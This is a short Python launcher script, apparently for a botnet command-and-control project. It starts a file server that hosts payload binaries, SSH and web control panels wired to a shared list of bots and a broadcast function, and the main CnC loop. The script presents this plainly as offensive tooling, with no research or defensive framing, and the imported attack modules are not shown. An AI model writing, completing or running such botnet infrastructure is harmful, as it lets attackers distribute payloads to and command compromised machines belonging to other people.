import sys
from src.serve import FileServer
from src.cnc import start as start_cnc, bots, broadcast
from src.ssh_cnc import start as start_ssh
from src.web_cnc import start as start_web

if __name__ == '__main__':
    payload_srv, _ = FileServer(directory="src/Payload/bins").start()
    ssh_srv, _ = start_ssh(bots_ref=bots, broadcast_ref=broadcast)
    web_srv, _ = start_web(bots_ref=bots, broadcast_ref=broadcast)
    try:
        start_cnc()
    except KeyboardInterrupt:
        print("\nShutting down all servers...")
        payload_srv.shutdown()
        ssh_srv.close()
        web_srv.shutdown()
        print("Done.")
